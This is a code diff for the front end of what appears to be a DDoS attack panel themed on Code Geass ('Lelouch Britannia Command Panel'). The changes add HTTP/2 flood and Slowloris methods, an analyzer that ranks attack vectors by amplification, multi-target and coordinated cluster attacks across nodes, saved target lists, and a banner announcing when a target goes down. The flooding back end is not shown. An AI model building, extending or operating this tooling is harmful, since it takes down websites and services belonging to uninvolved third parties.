   const localBytes = isRunning ? (currentAttack?.bytesSent   ?? 0) : lastAtkBytes;
   const totalPackets = localPkts  + (isRunning ? clusterTotalPkts  : 0);
   const totalBytes   = localBytes + (isRunning ? clusterTotalBytes : 0);
-  const totalNodes   = clusterNodes.filter(n => n.trim()).length + 1; // +1 for local
+  const totalNodes   = clusterNodes.filter(n => n.trim()).length + 1;
+
+  // Intensity for GeassEye animation (0–1 based on pps relative to a high reference)
+  const eyeIntensity = isRunning ? Math.min(1, pps / 50000) : 0;
+  const sparklineColor = method === "geass-override" ? "#C0392B"
+    : method === "http2-flood" ? "#1abc9c"
+    : method === "slowloris"   ? "#9b59b6"
+    : L7_HTTP_FE.has(method)   ? "#2ecc71"
+    : L4_TCP_FE.has(method)    ? "#3498db"
+    : L4_UDP_FE.has(method)    ? "#e67e22"
+    : "#D4AF37";
+  const isUDP = L4_UDP_FE.has(method);
 
   /* ── JSX ── */
   return (
     <div className={`lb-page ${entered ? "lb-entered" : ""}`}>
-      <GeassEye />
+      <GeassEye intensity={eyeIntensity} />
       <div className="lb-wrap">
 
         {/* ── Header ── */}
@@ -689,7 +841,7 @@ function Panel() {
           <p className="lb-sub">Because absolute power is even more beautiful when wielded by Zero.</p>
         </header>
 
-        {/* ── Presets ── */}
+        {/* ── Built-in Presets ── */}
         <div className="lb-presets">
           {PRESETS.map(p => (
             <button
@@ -716,8 +868,7 @@ function Panel() {
             <img
               src={GEASS_SYMBOL}
               className={`lb-gif-symbol${isRunning && method === "geass-override" ? " lb-gif-symbol--active" : ""}`}
-              aria-hidden="true"
-              alt=""
+              aria-hidden="true" alt=""
             />
             {isRunning && (
               <div className={`lb-attack-overlay${method === "geass-override" ? " lb-attack-overlay--geass" : ""}`} aria-hidden="true">
@@ -777,12 +928,17 @@ function Panel() {
               </button>
               <button
                 className={`lb-btn-icon lb-btn-analyze ${isAnalyzing ? "lb-btn-analyzing" : ""}`}
-                title="Analyze target — find the best attack method"
+                title="Analyze target"
                 onClick={handleAnalyze}
                 disabled={isAnalyzing || !target.trim()}
               >
                 {isAnalyzing ? "⏳" : "🔍"}
               </button>
+              <button
+                className="lb-btn-icon lb-btn-bench"
+                title="Quick benchmark vs httpbin.org"
+                onClick={handleBenchmark}
+              >⚗</button>
             </div>
 
             {/* ── Analyzer Panel ── */}
@@ -792,17 +948,14 @@ function Panel() {
                   <span className="lb-analyzer-title">👁 INTELLIGENCE ANALYSIS</span>
                   <button className="lb-analyzer-close" onClick={() => setShowAnalyze(false)}>✕</button>
                 </div>
-
                 {isAnalyzing && (
                   <div className="lb-analyzer-loading">
                     <div className="lb-analyzer-spinner"/>
                     <span>Scanning target vectors...</span>
                   </div>
                 )}
-
                 {!isAnalyzing && analyzeResult && (
                   <>
-                    {/* Target info strip */}
                     <div className="lb-analyze-info">
                       <span className="lai-item"><span className="lai-key">TARGET</span>{analyzeResult.target}</span>
                       {analyzeResult.ip && <span className="lai-item"><span className="lai-key">IP</span>{analyzeResult.ip}</span>}
@@ -827,8 +980,6 @@ function Panel() {
                         </span>
                       )}
                     </div>
-
-                    {/* Recommendations */}
                     <div className="lb-recs">
                       {analyzeResult.recommendations.map((rec, i) => (
                         <div key={rec.method} className={`lb-rec ${i === 0 ? "lb-rec--best" : ""}`}>
@@ -838,9 +989,7 @@ function Panel() {
                               <div className="lrec-name">
                                 {i === 0 && <span className="lrec-crown">★ BEST — </span>}
                                 {rec.name}
-                                {rec.amplification > 1 && (
-                                  <span className="lrec-amp">{rec.amplification}x AMP</span>
-                                )}
+                                {rec.amplification > 1 && <span className="lrec-amp">{rec.amplification}x AMP</span>}
                                 <span className="lrec-proto">{rec.protocol}</span>
                               </div>
                               <div className="lrec-reason">{rec.reason}</div>
@@ -850,8 +999,7 @@ function Panel() {
                               </div>
                             </div>
                           </div>
-                          <button
-                            className={`lrec-use ${i === 0 ? "lrec-use--best" : ""}`}
+                          <button className={`lrec-use ${i === 0 ? "lrec-use--best" : ""}`}
                             onClick={() => {
                               setMethod(rec.method);
                               setThreads(rec.suggestedThreads);
@@ -859,10 +1007,7 @@ function Panel() {
                               addLog(`👁 Applied: ${rec.name} — ${rec.suggestedThreads} threads, ${rec.suggestedDuration}s [Tier ${rec.tier}]`, "success");
                               if (soundRef.current) playTone("tick");
                               setShowAnalyze(false);
-                            }}
-                          >
-                            USE
-                          </button>
+                            }}>USE</button>
                         </div>
                       ))}
                     </div>
@@ -886,8 +1031,14 @@ function Panel() {
                 <label>Attack Method</label>
                 <select className="lb-select" value={method} onChange={e => setMethod(e.target.value)}>
                   {methods.length === 0
-                    ? <><option value="http-flood">HTTP Flood</option><option value="udp-flood">UDP Flood</option><option value="tcp-flood">TCP Flood</option></>
-                    : methods.map(m => <option key={m.id} value={m.id}>{m.name}</option>)
+                    ? <>
+                        <option value="http-flood">HTTP Flood</option>
+                        <option value="http2-flood">HTTP/2 Flood</option>
+                        <option value="slowloris">Slowloris</option>
+                        <option value="udp-flood">UDP Flood</option>
+                        <option value="tcp-flood">TCP Flood</option>
+                      </>
+                    : methods.map((m: { id: string; name: string }) => <option key={m.id} value={m.id}>{m.name}</option>)
                   }
                 </select>
               </div>
@@ -916,6 +1067,112 @@ function Panel() {
                 )}
               </div>
 
+              {/* ── Multi-Target Mode ── */}
+              <div className="lb-field lb-field--cluster">
+                <label className="lb-webhook-toggle" onClick={() => setShowMultiTarget(v => !v)}>
+                  {showMultiTarget ? "▲" : "▼"} Multi-Target Mode
+                  {extraTargets.filter(t => t.trim()).length > 0 && (
+                    <span className="lb-cluster-badge">{extraTargets.filter(t=>t.trim()).length+1} TARGETS</span>
+                  )}
+                </label>
+                {showMultiTarget && (
+                  <div className="lb-cluster-body">
+                    <div className="lb-cluster-hint">Attack up to 3 targets simultaneously. Extra targets get 50% of the thread count.</div>
+                    {([0, 1] as const).map(idx => (
+                      <input
+                        key={idx}
+                        className="lb-num lb-cluster-input"
+                        type="text"
+                        placeholder={`Extra target ${idx + 2} (URL or IP)`}
+                        value={extraTargets[idx]}
+                        onChange={e => setExtraTargets(prev => {
+                          const next: [string, string] = [...prev] as [string, string];
+                          next[idx] = e.target.value;
+                          return next;
+                        })}
+                      />
+                    ))}
+                  </div>
+                )}
+              </div>
+
+              {/* ── Named Targets ── */}
+              <div className="lb-field lb-field--cluster">
+                <label className="lb-webhook-toggle" onClick={() => setShowNamedTargets(v => !v)}>
+                  {showNamedTargets ? "▲" : "▼"} Named Targets
+                  {namedTargets.length > 0 && (
+                    <span className="lb-cluster-badge">{namedTargets.length} SAVED</span>
+                  )}
+                </label>
+                {showNamedTargets && (
+                  <div className="lb-cluster-body">
+                    {target.trim() && (
+                      <div className="lb-named-save-row">
+                        <input
+                          className="lb-num"
+                          style={{ flex: 1 }}
+                          placeholder="Label for current target..."
+                          value={newNameLabel}
+                          onChange={e => setNewNameLabel(e.target.value)}
+                          onKeyDown={e => e.key === "Enter" && saveNamedTarget()}
+                        />
+                        <button className="lb-cluster-add-btn" onClick={saveNamedTarget}>SAVE</button>
+                      </div>
+                    )}
+                    {namedTargets.length > 0 && (
+                      <div className="lb-cluster-list">
+                        {namedTargets.map(nt => (
+                          <div key={nt.url} className="lb-cluster-node lb-named-node">
+                            <span className="lb-cluster-node-dot"/>
+                            <span className="lb-named-label" onClick={() => setTarget(nt.url)}>{nt.label}</span>
+                            <span className="lb-named-url">{nt.url}</span>
+                            <button className="lb-fav-rm" onClick={() => removeNamedTarget(nt.url)}>✕</button>
+                          </div>
+                        ))}
+                      </div>
+                    )}
+                  </div>
+                )}
+              </div>
+
+              {/* ── Custom Presets ── */}
+              <div className="lb-field lb-field--cluster">
+                <label className="lb-webhook-toggle" onClick={() => setShowCustomPresets(v => !v)}>
+                  {showCustomPresets ? "▲" : "▼"} Custom Presets
+                  {userPresets.length > 0 && (
+                    <span className="lb-cluster-badge">{userPresets.length} SAVED</span>
+                  )}
+                </label>
+                {showCustomPresets && (
+                  <div className="lb-cluster-body">
+                    <div className="lb-cluster-hint">Save the current config as a named preset.</div>
+                    <div className="lb-named-save-row">
+                      <input
+                        className="lb-num"
+                        style={{ flex: 1 }}
+                        placeholder="Preset name..."
+                        value={newPresetLabel}
+                        onChange={e => setNewPresetLabel(e.target.value)}
+                        onKeyDown={e => e.key === "Enter" && saveUserPreset()}
+                      />
+                      <button className="lb-cluster-add-btn" onClick={saveUserPreset}>SAVE</button>
+                    </div>
+                    {userPresets.length > 0 && (
+                      <div className="lb-cluster-list">
+                        {userPresets.map(p => (
+                          <div key={p.id} className="lb-cluster-node lb-named-node">
+                            <span className="lb-cluster-node-dot"/>
+                            <span className="lb-named-label" style={{ cursor: "pointer" }} onClick={() => applyUserPreset(p)}>{p.label}</span>
+                            <span className="lb-named-url">{p.method} · {p.threads}T · {p.duration}s</span>
+                            <button className="lb-fav-rm" onClick={() => deleteUserPreset(p.id)}>✕</button>
+                          </div>
+                        ))}
+                      </div>
+                    )}
+                  </div>
+                )}
+              </div>
+
               {/* ── Cluster Mode ── */}
               <div className="lb-field lb-field--cluster">
                 <label className="lb-webhook-toggle" onClick={() => setShowCluster(v => !v)}>
@@ -926,7 +1183,22 @@ function Panel() {
                 </label>
                 {showCluster && (
                   <div className="lb-cluster-body">
-                    <div className="lb-cluster-hint">Add your other deployed API node URLs. On launch, all nodes attack simultaneously.</div>
+                    <div className="lb-cluster-hint">Add deployed API node URLs. All nodes attack simultaneously.</div>
+                    {/* Smart LB toggle */}
+                    <label className="lb-smart-lb-toggle">
+                      <input type="checkbox" checked={smartLB} onChange={e => {
+                        setSmartLB(e.target.checked);
+                        localStorage.setItem("lb-smart-lb", e.target.checked ? "1" : "0");
+                      }}/>
+                      <span className="lb-smart-lb-label">
+                        Smart Load Balance — auto-assign different vectors per node
+                        {smartLB && clusterNodes.length > 0 && (
+                          <span className="lb-smart-lb-preview">
+                            {" "}[{["local:" + method, ...clusterNodes.map((_, i) => `n${i+1}:${getSmartMethod(method, i+1)}`)].join(" · ")}]
+                          </span>
+                        )}
+                      </span>
+                    </label>
                     <div className="lb-cluster-add-row">
                       <input
                         className="lb-num lb-cluster-input"
@@ -940,12 +1212,14 @@ function Panel() {
                     </div>
                     {clusterNodes.length > 0 && (
                       <div className="lb-cluster-list">
-                        {clusterNodes.map(node => (
+                        {clusterNodes.map((node, nodeIdx) => (
                           <div key={node} className={`lb-cluster-node ${isRunning && clusterAttackIds.some(a => a.node === node) ? "lb-cluster-node--active" : ""}`}>
                             <span className="lb-cluster-node-dot"/>
                             <span className="lb-cluster-node-url">{node}</span>
                             {isRunning && clusterAttackIds.some(a => a.node === node) && (
-                              <span className="lb-cluster-node-firing">FIRING</span>
+                              <span className="lb-cluster-node-firing">
+                                FIRING {smartLB ? `[${getSmartMethod(method, nodeIdx + 1).toUpperCase()}]` : ""}
+                              </span>
                             )}
                             <button className="lb-fav-rm" onClick={() => removeClusterNode(node)}>✕</button>
                           </div>
@@ -957,57 +1231,71 @@ function Panel() {
               </div>
             </div>
 
-            {/* Stats — 4 boxes + sparkline */}
+            {/* Stats — 4 boxes + sparklines */}
             <div className="lb-stats">
               <div className="lb-stat lb-stat--red">
                 <div className="lb-stat-head">
-                  <span>{L4_UDP_FE.has(method) ? "💥" : "⚡"}</span>
-                  {L4_UDP_FE.has(method) ? "Pkt/sec" : L4_TCP_FE.has(method) ? "Conn/sec" : "Req/sec"}
+                  <span className="lb-stat-label">{isUDP ? "Pkt/sec" : "Req/sec"}</span>
+                  <span className="lb-stat-live">LIVE</span>
                 </div>
-                <div className="lb-stat-val">{isRunning ? fmtNum(pps) : "—"}</div>
-                {isRunning && peakPps > 0 && (
-                  <div className="lb-stat-peak">PEAK {fmtNum(peakPps)}</div>
-                )}
+                <div className="lb-stat-val">{fmtNum(pps)}</div>
+                <div className="lb-stat-sub">Peak {fmtNum(peakPps)}</div>
               </div>
               <div className="lb-stat lb-stat--gold">
-                <div className="lb-stat-head"><span>📶</span> Bandwidth</div>
-                <div className="lb-stat-val">{isRunning ? fmtBps(bps) : "—"}</div>
-                {isRunning && peakBps > 0 && (
-                  <div className="lb-stat-peak">PEAK {fmtBps(peakBps)}</div>
-                )}
+                <div className="lb-stat-head">
+                  <span className="lb-stat-label">Bandwidth</span>
+                  <span className="lb-stat-live">OUT</span>
+                </div>
+                <div className="lb-stat-val">{fmtBps(bps)}</div>
+                <div className="lb-stat-sub">Peak {fmtBps(peakBps)}</div>
               </div>
               <div className="lb-stat lb-stat--dim">
-                <div className="lb-stat-head"><span>{clusterAttackIds.length > 0 ? "🌐" : "👑"}</span> {clusterAttackIds.length > 0 ? "Cluster" : "Threads"}</div>
-                <div className="lb-stat-val">
-                  {clusterAttackIds.length > 0
-                    ? <>{clusterAttackIds.length + 1}<span style={{fontSize:"0.55em",color:"#8A7B65"}}> nodes</span></>
-                    : isRunning ? threads : "—"
-                  }
+                <div className="lb-stat-head">
+                  <span className="lb-stat-label">Total {isUDP ? "Pkts" : "Reqs"}</span>
+                  {clusterAttackIds.length > 0 && <span className="lb-stat-live">CLUSTER</span>}
                 </div>
-                {isRunning && (
-                  <div className="lb-stat-peak" style={{ color: clusterAttackIds.length > 0 ? "#D4AF37" : pw.color }}>
-                    {clusterAttackIds.length > 0 ? `${totalNodes}× COMBINED` : pw.label}
-                  </div>
-                )}
+                <div className="lb-stat-val">{fmtNum(totalPackets)}</div>
+                <div className="lb-stat-sub">{fmtBytes(totalBytes)}</div>
               </div>
-              <div className="lb-stat lb-stat--wide">
-                <div className="lb-stat-head"><span>📡</span> Total Impact</div>
-                <div className="lb-stat-val lb-stat-val--mono">
-                  {fmtNum(totalPackets)} <span className="lb-stat-bytes">({fmtBytes(totalBytes)})</span>
+              <div className="lb-stat lb-stat--dim">
+                <div className="lb-stat-head">
+                  <span className="lb-stat-label">All Time</span>
+                  <span className="lb-stat-live">DB</span>
                 </div>
+                <div className="lb-stat-val">{fmtNum(stats?.totalPacketsSent ?? 0)}</div>
+                <div className="lb-stat-sub">{fmtBytes(stats?.totalBytesSent ?? 0)}</div>
               </div>
-              {isRunning && ppsHistory.length >= 3 && (
-                <div className="lb-sparkline-wrap">
+
+              {/* Sparklines */}
+              {isRunning && ppsHistory.length > 1 && (
+                <div className="lb-sparkline-block">
                   <div className="lb-sparkline-label">
                     <span>LIVE TRAFFIC — {method.toUpperCase()}</span>
                     <span className={`lb-method-badge lb-method-badge--${mi.cls}`}>{mi.badge}</span>
                   </div>
-                  <Sparkline data={ppsHistory} color={method === "geass-override" ? "#C0392B" : L7_HTTP_FE.has(method) ? "#2ecc71" : L4_TCP_FE.has(method) ? "#3498db" : L4_UDP_FE.has(method) ? "#e67e22" : "#D4AF37"} />
+                  <Sparkline data={ppsHistory} color={sparklineColor} />
+                </div>
+              )}
+
+              {/* Latency sparkline */}
+              {isRunning && latencyHistory.length > 1 && (
+                <div className="lb-sparkline-block lb-sparkline-block--latency">
+                  <div className="lb-sparkline-label">
+                    <span>PROBE LATENCY</span>
+                    <span className="lb-lat-val" style={{
+                      color: latencyHistory[latencyHistory.length-1] > 2000 ? "#C0392B"
+                           : latencyHistory[latencyHistory.length-1] > 800  ? "#e67e22"
+                           : "#2ecc71"
+                    }}>
+                      {latencyHistory[latencyHistory.length-1]}ms
+                    </span>
+                  </div>
+                  <Sparkline data={latencyHistory} color="#9b59b6" />
                 </div>
               )}
             </div>
 
-            {/* Target status banner — shows during attack */}
+            {/* Target status banner */}
             {isRunning && targetStatus !== "unknown" && (
               <div className={`lb-target-status ${targetStatus === "offline" ? "ts-offline" : "ts-online"}`}>
                 <span className="ts-dot"/>
@@ -1017,7 +1305,21 @@ function Panel() {
                     : `💥 TARGET DOWN — ${target} not responding`
                   }
                 </span>
-                <span className="ts-monitor">Monitoring every 6s</span>
+                <span className="ts-monitor">
+                  {latencyHistory.length > 0 ? `${latencyHistory[latencyHistory.length-1]}ms probe` : "Monitoring every 6s"}
+                </span>
+              </div>
+            )}
+
+            {/* Multi-target status */}
+            {isRunning && extraAttackIds.filter(id => id !== null).length > 0 && (
+              <div className="lb-multi-status">
+                <span className="lb-multi-label">⚡ MULTI-TARGET ACTIVE</span>
+                {extraTargets.filter(t => t.trim()).map((et, i) => (
+                  <span key={i} className="lb-multi-target">
+                    <span className="lb-cluster-node-dot"/> {et} [#{extraAttackIds[i] ?? "?"}]
+                  </span>
+                ))}
               </div>
             )}
 
@@ -1082,15 +1384,22 @@ function Panel() {
                 <div className="lb-history-list">
                   {allAttacks.length === 0
                     ? <div className="lb-history-empty">No attacks on record.</div>
-                    : allAttacks.map(a => (
-                      <div key={a.id} className="lb-history-item">
-                        <span className="lh-target" title={a.target}>{a.target}</span>
-                        <span className="lh-method">{a.method}</span>
-                        <span className={`lh-badge lhb-${a.status}`}>{a.status}</span>
-                        <span className="lh-pkts">{fmtNum(a.packetsSent ?? 0)} pkts</span>
-                        <span className="lh-bytes">{fmtBytes(a.bytesSent ?? 0)}</span>
-                      </div>
-                    ))
+                    : allAttacks.map((a: { id: number; target: string; method: string; status: string; packetsSent?: number | null; bytesSent?: number | null; duration?: number | null; createdAt: string | Date; stoppedAt?: string | Date | null }) => {
+                        const dur = a.stoppedAt
+                          ? Math.round((new Date(a.stoppedAt).getTime() - new Date(a.createdAt).getTime()) / 1000)
+                          : a.duration ?? 0;
+                        const rps = dur > 0 ? Math.round((a.packetsSent ?? 0) / dur) : 0;
+                        return (
+                          <div key={a.id} className="lb-history-item" onClick={() => setTarget(a.target)} style={{ cursor: "pointer" }}>
+                            <span className="lh-target" title={a.target}>{a.target}</span>
+                            <span className="lh-method">{a.method}</span>
+                            <span className={`lh-badge lhb-${a.status}`}>{a.status}</span>
+                            <span className="lh-pkts">{fmtNum(a.packetsSent ?? 0)} pkts</span>
+                            <span className="lh-bytes">{fmtBytes(a.bytesSent ?? 0)}</span>
+                            {rps > 0 && <span className="lh-rps" style={{ color: "#D4AF37" }}>{fmtNum(rps)}/s</span>}
+                          </div>
+                        );
+                      })
                   }
                 </div>
               )}
@@ -1100,7 +1409,7 @@ function Panel() {
 
         <footer className="lb-footer">
           <img src={GEASS_SYMBOL} className="lb-footer-symbol" alt=""/>
-          v2.0 — Lelouch Britannia Command Panel
+          v3.0 — Lelouch Britannia Command Panel
           <img src={GEASS_SYMBOL} className="lb-footer-symbol" alt="" aria-hidden="true"/>
         </footer>
         <div className="lb-footer-bar"><div className="lb-footer-fill" style={{ width: `${progress}%` }}/></div>
